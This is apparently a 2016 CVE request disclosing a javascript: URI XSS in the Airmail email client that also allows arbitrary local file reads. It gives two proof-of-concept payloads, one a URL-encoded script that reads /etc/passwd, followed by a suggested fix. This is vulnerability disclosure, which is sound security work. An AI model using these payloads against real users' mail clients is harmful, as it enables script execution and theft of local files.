Subject: CVE request - Airmail URLScheme render and file:// xss vulnerability

Airmail is a popular email client on iOS and OS X.
I found a vulnerability in airmail of the latest version which could cause
a file:// xss and arbitrary file read.

Author: redrain, yu.hong@...itin.com
Date: 2016-08-15
Version: 3.0.2 and earlier
Platform: OS X and iOS
Site: http://airmailapp.com/
Vendor: http://airmailapp.com/

Vulnerability:
There is a file:// xss in airmail version 3.0.2 and earlier.
The app can deal the URLscheme render with link detection, any user can
edit the email content in reply with the evil code with the TL;DR.

Airmail implements its user interface using an embedded version of WebKit,
furthermore Airmail on OS X will render any URI as a clickable HTML <a
href= link. An attacker can create a simple JavaScript URI (e.g.,
javascript:) which when clicked grants the attacker initial JavaScript
execution (XSS) in the context of the application DOM.


PoC:
javascript://www.baidu.com/research?%0Aprompt(1)

​

Arbitrary file read:

javascript://www.baidu.com/research?%0Afunction%20reqListene
r%20()%20%7B%0A%20%20prompt(this.responseText)%3B%0A%7D%0Ava
r%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0AoReq.addEventLi
stener(%22load%22%2C%20reqListener)%3B%0AoReq.open(
%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B


​
Resolution:

Airmail call the webkit to translate the html, javascript: and
javascript://%0a%0d  are supported because of link detection in webkit
info.plist.

So we can just broke the URI, for example, add a “<blank>” behind the
“javascript” OS X and iOS will not render this URI as a clickable HTML <a
href=xxx>


Could you assign CVE id for this?
